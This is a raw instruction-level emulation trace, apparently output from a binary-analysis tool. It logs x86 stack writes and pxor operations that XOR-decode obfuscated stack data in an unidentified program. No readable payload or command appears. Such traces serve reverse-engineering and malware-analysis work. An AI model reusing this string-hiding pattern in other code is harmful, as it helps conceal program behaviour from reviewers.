regs_write: () adjusting stack for ESP 0x74c and offset 0x82f0 for stack size 0x10000 saving data to stack: 914789047 4 0x45e995: mov dword ptr [esp + 0x2f4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x74c and offset 0x82f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45e99c: mov dword ptr [esp + 0x2fc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x74c and offset 0x82fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45e9a3: pxor xmm1, xmmword ptr [esp + 0x2f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x74c and offset 0x82f0 for stack size 0x10000 0x45e9ac: movaps xmmword ptr [esp + 0x90], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x74c and offset 0x8090 for stack size 0x10000 saving data to stack: 1163219540 16 0x45e9b6: mov dword ptr [esp + 0xa8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x74c and offset 0x80a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45e9bd: mov dword ptr [esp + 0xa0], 0x65cad3f1, regs_read: [30], regs_write: () adjusting stack for ESP 0x74c and offset 0x80a0 for stack size 0x10000 saving data to stack: 1707791345 4 0x45e9c8: mov dword ptr [esp + 0xa4], 0x35694ead, regs_read: [30], regs_write: () adjusting stack for ESP 0x74c and offset 0x80a4 for stack size 0x10000 saving data to stack: 896093869 4 0x45e9d3: mov dword ptr [esp + 0xac], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x74c and offset 0x80ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45e9da: movaps xmm1, xmmword ptr [esp + 0xa0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x74c and offset 0x80a0 for stack size 0x10000 0x45e9e2: mov dword ptr [esp + 0x308], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x74c and offset 0x8308 for stack size 0x10000 saving data to stack: 929680980 4 0x45e9f0: mov dword ptr [esp + 0x300], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x74c and offset 0x8300 for stack size 0x10000 saving data to stack: 914789047 4 0x45e9fb: mov dword ptr [esp + 0x304], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x74c and offset 0x8304 for stack size 0x10000 saving data to stack: 896093928 4 0x45ea06: mov dword ptr [esp + 0x30c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x74c and offset 0x830c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ea0d: pxor xmm1, xmmword ptr [esp + 0x300], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x74c and offset 0x8300 for stack size 0x10000 0x45ea16: movaps xmmword ptr [esp + 0xa0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x74c and offset 0x80a0 for stack size 0x10000 saving data to stack: 297750249798 16 0x45ea34: mov dword ptr [esp + 0x3d0], 0x7b7bee00, regs_read: [30], regs_write: () adjusting stack for ESP 0x74c and offset 0x83d0 for stack size 0x10000 saving data to stack: 2071719424 4 0x45ea5d: push esi, regs_read: [30, 29], regs_write: [30] 0x45ea6e: push edx, regs_read: [30, 24], regs_write: [30] 0x45ea6f: push dword ptr [esp + 0x1c], regs_read: [30], regs_write: [30] 0x45ea7b: push dword ptr [esp + 0x24], regs_read: [30], regs_write: [30] 0x45ea87: push dword ptr [esp + 0x38], regs_read: [30], regs_write: [30] 0x45ea93: mov dword ptr [esp + 0x3e8], 0x8ef2ee3b, regs_read: [30], regs_write: () adjusting stack for ESP 0x738 and offset 0x83e8 for stack size 0x10000 saving data to stack: 2398285371 4 0x45ea9e: mov dword ptr [esp + 0x3ec], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP 0x738 and offset 0x83ec for stack size 0x10000 saving data to stack: 586689126 4 0x45eaa9: mov dword ptr [esp + 0x3f0], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP 0x738 and offset 0x83f0 for stack size 0x10000 saving data to stack: 1701587195 4 0x45eab4: push ecx, regs_read: [30, 22], regs_write: [30] 0x45eab5: mov dword ptr [esp + 0x3d8], 0x138fe192, regs_read: [30], regs_write: () adjusting stack for ESP 0x734 and offset 0x83d8 for stack size 0x10000 saving data to stack: 328196498 4 0x45eac0: mov dword ptr [esp + 0x3dc], 0x464c479b, regs_read: [30], regs_write: () adjusting stack for ESP 0x734 and offset 0x83dc for stack size 0x10000 saving data to stack: 1179404187 4 0x45eacb: mov dword ptr [esp + 0x3e0], 0x3e1aeb5d, regs_read: [30], regs_write: () adjusting stack for ESP 0x734 and offset 0x83e0 for stack size 0x10000 saving data to stack: 1041951581 4 0x45ead6: mov dword ptr [esp + 0x3e4], 0x27a68cb0, regs_read: [30], regs_write: () adjusting stack for ESP 0x734 and offset 0x83e4 for stack size 0x10000 saving data to stack: 665226416 4 0x45eae1: movaps xmm1, xmmword ptr [esp + 0x3d8], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x734 and offset 0x83d8 for stack size 0x10000 0x45eae9: push edi, regs_read: [30, 23], regs_write: [30] 0x45eaea: mov edi, dword ptr [esp + 0x40], regs_read: [30], regs_write: [23] adjusting stack for ESP 0x730 and offset 0x8040 for stack size 0x10000 0x45eaee: push eax, regs_read: [30, 19], regs_write: [30] 0x45eaef: mov dword ptr [esp + 0x1f0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x72c and offset 0x81f0 for stack size 0x10000 saving data to stack: 914789047 4 0x45eb01: mov dword ptr [esp + 0x1f4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x72c and offset 0x81f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45eb0c: mov dword ptr [esp + 0x1f8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x72c and offset 0x81f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45eb17: mov dword ptr [esp + 0x1fc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x72c and offset 0x81fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45eb22: pxor xmm1, xmmword ptr [esp + 0x1f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x72c and offset 0x81f0 for stack size 0x10000 0x45eb2b: movaps xmmword ptr [esp + 0x3e0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x72c and offset 0x83e0 for stack size 0x10000 saving data to stack: 156082637002160692381338396013141521189 16 0x45eb33: mov dword ptr [esp + 0x200], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP 0x72c and offset 0x8200 for stack size 0x10000 saving data to stack: 1913178889 4 0x45eb3e: mov dword ptr [esp + 0x204], 0x84ff9d1e, regs_read: [30], regs_write: () adjusting stack for ESP 0x72c and offset 0x8204 for stack size 0x10000 saving data to stack: 2231344414 4 0x45eb49: mov dword ptr [esp + 0x208], 0x22f82a66, regs_read: [30], regs_write: () adjusting stack for ESP 0x72c and offset 0x8208 for stack size 0x10000 saving data to stack: 586689126 4 0x45eb54: mov dword ptr [esp + 0x20c], 0x656c28fb, regs_read: [30], regs_write: () adjusting stack for ESP 0x72c and offset 0x820c for stack size 0x10000 saving data to stack: 1701587195 4 0x45eb5f: movaps xmm1, xmmword ptr [esp + 0x200], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x72c and offset 0x8200 for stack size 0x10000 0x45eb67: pxor xmm1, xmmword ptr [esp + 0x3f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x72c and offset 0x83f0 for stack size 0x10000 0x45eb70: push eax, regs_read: [30, 19], regs_write: [30] 0x45eb71: push edi, regs_read: [30, 23], regs_write: [30] 0x45eb72: movaps xmmword ptr [esp + 0x3f8], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x724 and offset 0x83f8 for stack size 0x10000 saving data to stack: 724361717986043145 16 0x45ebc5: push eax, regs_read: [30, 19], regs_write: [30] 0x45ebda: push edi, regs_read: [30, 23], regs_write: [30] 0x45ebe0: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45ebe1: mov edi, dword ptr [esp + 0x10], regs_read: [30], regs_write: [23] adjusting stack for ESP 0x720 and offset 0x8010 for stack size 0x10000 0x45ebe5: mov byte ptr [esp + 0xf], 1, regs_read: [30], regs_write: () adjusting stack for ESP 0x720 and offset 0x800f for stack size 0x10000 saving data to stack: 1 1 0x45ebf3: mov eax, dword ptr [esp + 0x1c], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x720 and offset 0x801c for stack size 0x10000 0x45ec1d: push eax, regs_read: [30, 19], regs_write: [30] 0x45ec3b: mov eax, dword ptr [esp + 0x20], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x71c and offset 0x8020 for stack size 0x10000 0x45ec52: mov esi, 0x4f0740, regs_read: (), regs_write: [29] 0x45ec57: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ec73: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ec7a: mov eax, dword ptr [esp + 0x60], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x71c and offset 0x8060 for stack size 0x10000 0x45ec7e: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45ec80: mov dword ptr [esp + 0x14], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x71c and offset 0x8014 for stack size 0x10000 saving data to stack: 0 4 0x45ec8c: mov dword ptr [esp + 0x24], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x71c and offset 0x8024 for stack size 0x10000 saving data to stack: 0 4 0x45ec9c: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ecb2: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ecb4: push eax, regs_read: [30, 19], regs_write: [30] 0x45ecc1: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ecc3: push eax, regs_read: [30, 19], regs_write: [30] 0x45ecde: mov esi, eax, regs_read: [19], regs_write: [29] 0x45ece9: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ecf0: mov eax, dword ptr [esp + 0x68], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x714 and offset 0x8068 for stack size 0x10000 0x45ecf4: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45ecf6: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x714 and offset 0x8018 for stack size 0x10000 saving data to stack: 0 4 0x45ed05: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45ed21: mov dword ptr [esp + 0xa0], 0x368692e8, regs_read: [30], regs_write: () adjusting stack for ESP 0x714 and offset 0x80a0 for stack size 0x10000 saving data to stack: 914789096 4 0x45ed2c: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45ed31: mov dword ptr [esp + 0x10], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x714 and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x45ed35: mov ecx, 0x52cae095, regs_read: (), regs_write: [22] 0x45ed3a: mov dword ptr [esp + 0xa8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x714 and offset 0x80a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45ed41: mov edi, 0x35694ee8, regs_read: (), regs_write: [23] 0x45ed46: mov dword ptr [esp + 0xac], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x714 and offset 0x80ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45ed4d: mov dword ptr [esp + 0xa4], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x714 and offset 0x80a4 for stack size 0x10000 saving data to stack: 896093928 4 0x45ed54: movaps xmm1, xmmword ptr [esp + 0xa0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x714 and offset 0x80a0 for stack size 0x10000 0x45ed5c: mov dword ptr [esp + 0x32c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x714 and offset 0x832c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ed6a: mov dword ptr [esp + 0x328], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x714 and offset 0x8328 for stack size 0x10000 saving data to stack: 929680980 4 0x45ed71: mov dword ptr [esp + 0x320], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x714 and offset 0x8320 for stack size 0x10000 saving data to stack: 914789047 4 0x45ed7c: mov dword ptr [esp + 0x324], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x714 and offset 0x8324 for stack size 0x10000 saving data to stack: 896093928 4 0x45ed83: pxor xmm1, xmmword ptr [esp + 0x320], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x714 and offset 0x8320 for stack size 0x10000 0x45ed8c: push edx, regs_read: [30, 24], regs_write: [30] 0x45ed94: movaps xmmword ptr [esp + 0xa4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x710 and offset 0x80a4 for stack size 0x10000 saving data to stack: 95 16 0x45eda1: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45edae: push 0x4dc55b, regs_read: [30], regs_write: [30] 0x45edb3: mov dword ptr [esp + 0x14], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x710 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x45edbc: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45edc1: mov dword ptr [esp + 0x70], 0x3686f0d6, regs_read: [30], regs_write: () adjusting stack for ESP 0x710 and offset 0x8070 for stack size 0x10000 saving data to stack: 914813142 4 0x45edc9: mov ecx, 0x52cae095, regs_read: (), regs_write: [22] 0x45edce: mov dword ptr [esp + 0x74], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x710 and offset 0x8074 for stack size 0x10000 saving data to stack: 896093928 4 0x45edd2: mov edi, eax, regs_read: [19], regs_write: [23] 0x45edd4: mov dword ptr [esp + 0x7c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x710 and offset 0x807c for stack size 0x10000 saving data to stack: 1389027477 4 0x45edd8: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45eddd: mov dword ptr [esp + 0x314], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x710 and offset 0x8314 for stack size 0x10000 saving data to stack: 896093928 4 0x45ede4: mov dword ptr [esp + 0x78], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x710 and offset 0x8078 for stack size 0x10000 saving data to stack: 929680980 4 0x45ede8: movaps xmm1, xmmword ptr [esp + 0x70], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x710 and offset 0x8070 for stack size 0x10000 0x45eded: mov dword ptr [esp + 0x318], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x710 and offset 0x8318 for stack size 0x10000 saving data to stack: 929680980 4 0x45edf4: mov dword ptr [esp + 0x31c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x710 and offset 0x831c for stack size 0x10000 saving data to stack: 1389027477 4 0x45edfb: mov dword ptr [esp + 0x310], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x710 and offset 0x8310 for stack size 0x10000 saving data to stack: 914789047 4 0x45ee06: pxor xmm1, xmmword ptr [esp + 0x310], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x710 and offset 0x8310 for stack size 0x10000 0x45ee0f: movaps xmmword ptr [esp + 0x70], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x710 and offset 0x8070 for stack size 0x10000 saving data to stack: 25185 16 0x45ee14: mov dword ptr [esp + 0x304], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x710 and offset 0x8304 for stack size 0x10000 saving data to stack: 896093928 4 0x45ee1b: mov dword ptr [esp + 0x308], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x710 and offset 0x8308 for stack size 0x10000 saving data to stack: 929680980 4 0x45ee22: mov dword ptr [esp + 0x30c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x710 and offset 0x830c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ee29: mov dword ptr [esp + 0x84], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x710 and offset 0x8084 for stack size 0x10000 saving data to stack: 896093928 4 0x45ee30: mov dword ptr [esp + 0x88], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x710 and offset 0x8088 for stack size 0x10000 saving data to stack: 929680980 4 0x45ee37: mov dword ptr [esp + 0x8c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x710 and offset 0x808c for stack size 0x10000 saving data to stack: 1389027477 4 0x45ee3e: mov dword ptr [esp + 0x300], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x710 and offset 0x8300 for stack size 0x10000 saving data to stack: 914789047 4 0x45ee49: movaps xmm1, xmmword ptr [esp + 0x300], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x710 and offset 0x8300 for stack size 0x10000 0x45ee51: mov dword ptr [esp + 0x80], 0x42fee699, regs_read: [30], regs_write: () adjusting stack for ESP 0x710 and offset 0x8080 for stack size 0x10000 saving data to stack: 1124001433 4 0x45ee5c: pxor xmm1, xmmword ptr [esp + 0x80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x710 and offset 0x8080 for stack size 0x10000 0x45ee65: mov dword ptr [esp + 0x2f4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x710 and offset 0x82f4 for stack size 0x10000 saving data to stack: 896093928 4 0x45ee6c: mov dword ptr [esp + 0x2f8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x710 and offset 0x82f8 for stack size 0x10000 saving data to stack: 929680980 4 0x45ee73: mov dword ptr [esp + 0x2fc], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x710 and offset 0x82fc for stack size 0x10000 saving data to stack: 1389027477 4 0x45ee7a: movaps xmmword ptr [esp + 0x80], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x710 and offset 0x8080 for stack size 0x10000 saving data to stack: 1954051118 16 0x45ee82: mov dword ptr [esp + 0x98], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x710 and offset 0x8098 for stack size 0x10000 saving data to stack: 929680980 4 0x45ee90: mov dword ptr [esp + 0x94], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x710 and offset 0x8094 for stack size 0x10000 saving data to stack: 896093928 4 0x45ee9e: mov dword ptr [esp + 0x9c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x710 and offset 0x809c for stack size 0x10000 saving data to stack: 1389027477 4 0x45eeac: mov dword ptr [esp + 0x2f0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x710 and offset 0x82f0 for stack size 0x10000 saving data to stack: 914789047 4 0x45eeb7: movaps xmm1, xmmword ptr [esp + 0x2f0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x710 and offset 0x82f0 for stack size 0x10000 0x45eebf: mov dword ptr [esp + 0x90], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP 0x710 and offset 0x8090 for stack size 0x10000 saving data to stack: 914789099 4 0x45eeca: pxor xmm1, xmmword ptr [esp + 0x90], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x710 and offset 0x8090 for stack size 0x10000 0x45eed3: push eax, regs_read: [30, 19], regs_write: [30] 0x45eed4: movaps xmmword ptr [esp + 0x94], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x70c and offset 0x8094 for stack size 0x10000 saving data to stack: 92 16 0x45eee1: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45eee2: push dword ptr [esp + 0x24], regs_read: [30], regs_write: [30] 0x45eee6: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45eeed: push eax, regs_read: [30, 19], regs_write: [30] 0x45eefa: push edi, regs_read: [30, 23], regs_write: [30] 0x45ef02: push eax, regs_read: [30, 19], regs_write: [30] 0x45ef03: push dword ptr [esp + 0x2c], regs_read: [30], regs_write: [30] 0x45ef1a: push eax, regs_read: [30, 19], regs_write: [30] 0x45ef27: push eax, regs_read: [30, 19], regs_write: [30] 0x45ef4f: push ecx, regs_read: [30, 22], regs_write: [30] 0x45ef50: push eax, regs_read: [30, 19], regs_write: [30] 0x45ef56: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45ef57: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45ef58: mov edi, eax, regs_read: [19], regs_write: [23] 0x45ef61: mov dword ptr [esp + 0x5c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6f4 and offset 0x805c for stack size 0x10000 saving data to stack: 896093928 4 0x45ef8e: mov eax, dword ptr [esp + 0x10], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x6f4 and offset 0x8010 for stack size 0x10000 0x45efa0: mov dword ptr [esp + 0x10], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6f4 and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x45efa9: mov eax, dword ptr [esp + 0x10], regs_read: [30], regs_write: [19] adjusting stack for ESP 0x6f4 and offset 0x8010 for stack size 0x10000 0x45efbb: mov dword ptr [esp + 0x10], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6f4 and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x45efd3: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45efd5: push eax, regs_read: [30, 19], regs_write: [30] 0x45efe2: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45efe4: push eax, regs_read: [30, 19], regs_write: [30] 0x45eff1: push eax, regs_read: [30, 19], regs_write: [30] 0x45f006: mov edx, 0x368692b7, regs_read: (), regs_write: [24] 0x45f00b: mov ecx, 0x35694ee8, regs_read: (), regs_write: [22] 0x45f010: mov edi, 0x3769ce54, regs_read: (), regs_write: [23] 0x45f015: mov dword ptr [esp + 0x2e0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82e0 for stack size 0x10000 saving data to stack: 914789047 4 0x45f01c: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45f021: mov dword ptr [esp + 0x2e4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82e4 for stack size 0x10000 saving data to stack: 896093928 4 0x45f028: mov dword ptr [esp + 0x2e8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82e8 for stack size 0x10000 saving data to stack: 929680980 4 0x45f02f: mov dword ptr [esp + 0x2ec], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82ec for stack size 0x10000 saving data to stack: 1389027477 4 0x45f036: mov dword ptr [esp + 0x2c0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82c0 for stack size 0x10000 saving data to stack: 914789047 4 0x45f03d: mov dword ptr [esp + 0x2c4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82c4 for stack size 0x10000 saving data to stack: 896093928 4 0x45f044: mov dword ptr [esp + 0x2c8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45f04b: mov dword ptr [esp + 0x2cc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45f052: mov dword ptr [esp + 0x2a0], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82a0 for stack size 0x10000 saving data to stack: 914789047 4 0x45f059: mov dword ptr [esp + 0x2a4], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82a4 for stack size 0x10000 saving data to stack: 896093928 4 0x45f060: mov dword ptr [esp + 0x2a8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45f067: mov dword ptr [esp + 0x2ac], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x82ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45f06e: mov dword ptr [esp + 0x280], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x8280 for stack size 0x10000 saving data to stack: 914789047 4 0x45f075: mov dword ptr [esp + 0x284], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x8284 for stack size 0x10000 saving data to stack: 896093928 4 0x45f07c: mov dword ptr [esp + 0x288], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x8288 for stack size 0x10000 saving data to stack: 929680980 4 0x45f083: mov dword ptr [esp + 0x28c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x828c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f08a: mov dword ptr [esp + 0x260], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x8260 for stack size 0x10000 saving data to stack: 914789047 4 0x45f091: mov dword ptr [esp + 0x264], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x8264 for stack size 0x10000 saving data to stack: 896093928 4 0x45f098: mov dword ptr [esp + 0x268], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x8268 for stack size 0x10000 saving data to stack: 929680980 4 0x45f09f: mov dword ptr [esp + 0x26c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x826c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f0a6: mov dword ptr [esp + 0x240], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x8240 for stack size 0x10000 saving data to stack: 914789047 4 0x45f0ad: mov dword ptr [esp + 0x244], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x8244 for stack size 0x10000 saving data to stack: 896093928 4 0x45f0b4: mov dword ptr [esp + 0x248], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x8248 for stack size 0x10000 saving data to stack: 929680980 4 0x45f0bb: mov dword ptr [esp + 0x24c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6e8 and offset 0x824c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f0c4: mov edi, 0x3769ce54, regs_read: (), regs_write: [23] 0x45f0d5: push 0x4dc55e, regs_read: [30], regs_write: [30] 0x45f0e1: mov esi, eax, regs_read: [19], regs_write: [29] 0x45f0e8: push 0x4dc55f, regs_read: [30], regs_write: [30] 0x45f0f9: push 0x4dc575, regs_read: [30], regs_write: [30] 0x45f10a: push 0x4dc576, regs_read: [30], regs_write: [30] 0x45f11b: movaps xmm1, xmmword ptr [esp + 0x2e0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x6d8 and offset 0x82e0 for stack size 0x10000 0x45f12a: mov dword ptr [esp + 0x190], 0x57ebfdd3, regs_read: [30], regs_write: () adjusting stack for ESP 0x6d8 and offset 0x8190 for stack size 0x10000 saving data to stack: 1475083731 4 0x45f138: mov dword ptr [esp + 0x194], 0x35692081, regs_read: [30], regs_write: () adjusting stack for ESP 0x6d8 and offset 0x8194 for stack size 0x10000 saving data to stack: 896082049 4 0x45f143: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f145: mov dword ptr [esp + 0x198], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6d8 and offset 0x8198 for stack size 0x10000 saving data to stack: 929680980 4 0x45f14c: mov dword ptr [esp + 0x19c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP 0x6d8 and offset 0x819c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f157: pxor xmm1, xmmword ptr [esp + 0x190], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x6d8 and offset 0x8190 for stack size 0x10000 0x45f160: push eax, regs_read: [30, 19], regs_write: [30] 0x45f16a: movaps xmmword ptr [esp + 0x194], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x6d4 and offset 0x8194 for stack size 0x10000 saving data to stack: 0 16 0x45f180: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45f185: mov dword ptr [esp + 0x2d0], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x6d4 and offset 0x82d0 for stack size 0x10000 saving data to stack: 914789047 4 0x45f190: mov dword ptr [esp + 0x2dc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6d4 and offset 0x82dc for stack size 0x10000 saving data to stack: 1389027477 4 0x45f197: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45f199: mov dword ptr [esp + 0x18c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x6d4 and offset 0x818c for stack size 0x10000 saving data to stack: 1389027477 4 0x45f1a7: mov dword ptr [esp + 0x2d4], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x6d4 and offset 0x82d4 for stack size 0x10000 saving data to stack: 896093928 4 0x45f1b2: mov dword ptr [esp + 0x2d8], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP 0x6d4 and offset 0x82d8 for stack size 0x10000 saving data to stack: 929680980 4 0x45f1b9: movaps xmm1, xmmword ptr [esp + 0x2d0], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x6d4 and offset 0x82d0 for stack size 0x10000 0x45f1c1: mov dword ptr [esp + 0x180], 0x57ebfdd3, regs_read: [30], regs_write: () adjusting stack for ESP 0x6d4 and offset 0x8180 for stack size 0x10000 saving data to stack: 1475083731 4 